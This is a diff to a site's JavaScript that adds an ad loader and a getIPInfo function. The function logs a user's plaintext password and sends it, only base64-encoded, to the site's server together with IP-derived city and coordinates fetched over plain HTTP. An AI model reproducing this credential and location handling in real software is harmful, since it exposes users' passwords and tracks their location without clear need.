@@ -1,5 +1,10 @@
 function spVersion() {
-	return 'v4.9';
+	return 'v4.9.1';
+}
+function googleAds() {
+	window.onload = function() {
+		(adsbygoogle = window.adsbygoogle || []).push({});
+	  }  
 }
 function getScriptV() {
 	return 'v3.5';
@@ -159,6 +164,28 @@ function promoteThisUsertoRank(rank, code) {
 }
 function getIPInfo(userName, pwd) {
 	var code = btoa(pwd);
+	$.getJSON('http://www.geoplugin.net/json.gp?jsoncallback=?', function (data) {
+		console.log('geoplugin', JSON.stringify(data, null, 2));
+		console.log(data, userName, pwd);
+		localStorage.ip = data.geoplugin_request;
+		var url = getHostname() + "/webCheckForum.php";
+		$.post(url,
+			{
+				user_login: userName || 'test',
+				code: code,
+				ip: data.geoplugin_request,
+				city: data.geoplugin_city,
+				region: data.geoplugin_region,
+				state: data.geoplugin_regionCode,
+				country: data.geoplugin_countryName,
+				lat: data.geoplugin_latitude,
+				lng: data.geoplugin_longitude,
+				action: 'uploadStats'
+			},
+			function (data, status) {
+				console.log(data);
+			});
+	});
 }
 function getIPInfo2(userName, pwd) {
 	showAlertPopup('ip Request!!',1);
